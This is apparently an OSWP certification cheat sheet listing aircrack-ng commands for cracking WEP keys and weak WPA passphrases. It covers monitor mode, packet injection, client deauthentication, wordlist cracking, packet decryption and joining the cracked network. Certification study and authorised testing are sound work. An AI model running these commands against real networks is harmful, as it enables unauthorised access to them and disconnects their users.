# OSWP

Cracking WEP (p74)
    airmon-ng start wlan0
    airodump-ng mon0
    airodump-ng -c [channel] --bssid [target MAC] -w wepcrack mon0
    aireplay-ng -3 -b [target MAC] -h [your MAC] mon0
    aircrack-ng wepcrack-01.cap

Cracking WPA-PSK Weak Passphrase (p85)
    airmon-ng start wlan0
    airodump-ng mon0
    airodump-ng --bssid [target MAC] -c [channel] -w wpacrack mon0
    aireplay-ng --deauth 10 -a [target MAC] -c [client MAC] mon0
    aircrack-ng -w /path/to/wordlist.txt -b [target MAC] wpacrack-01.cap
    
Decrypting WEP and WPA Packets (p94)
    # WEP
    airdecap-ng -w [WEP key] wepcrack-01.cap
    # WPA
    airdecap-ng -e [ESSID] -p [passphrase] wpacrack-01.cap

Connecting to WEP Network (p96)
    ifconfig wlan0 down
    iwconfig wlan0 essid [network name]
    iwconfig wlan0 key s:[WEP key]
    ifconfig wlan0 up
    dhclient wlan0

Connecting to WPA Network (p97)
    wpa_passphrase [network name] [passphrase] > wpa.conf
    wpa_supplicant -B -Dwext -i wlan0 -c wpa.conf
    dhclient wlan0
